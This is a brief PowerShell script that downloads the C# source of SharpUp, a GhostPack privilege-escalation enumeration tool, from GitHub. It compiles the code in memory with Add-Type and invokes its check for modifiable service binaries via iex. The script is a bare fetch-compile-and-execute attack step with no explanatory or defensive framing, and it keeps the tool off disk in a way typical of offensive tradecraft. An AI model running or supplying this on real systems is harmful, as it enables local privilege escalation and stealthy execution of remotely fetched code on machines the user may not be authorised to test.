 $id = Get-Random
$code = (iwr https://raw.githubusercontent.com/GhostPack/SharpUp/master/SharpUp/Program.cs -UseBasicParsing) -replace "class Program","public class Program$id"

$assemblies = ("System.Core","System.Xml.Linq","System.Data","System.Xml", "System.Data.DataSetExtensions", "Microsoft.CSharp", "System.ServiceProcess", "System.Management")
Add-Type -ReferencedAssemblies $assemblies -TypeDefinition $code -Language CSharp -IgnoreWarnings
iex "[SharpUp.Program$id]::GetModifiableServiceBinaries()" 
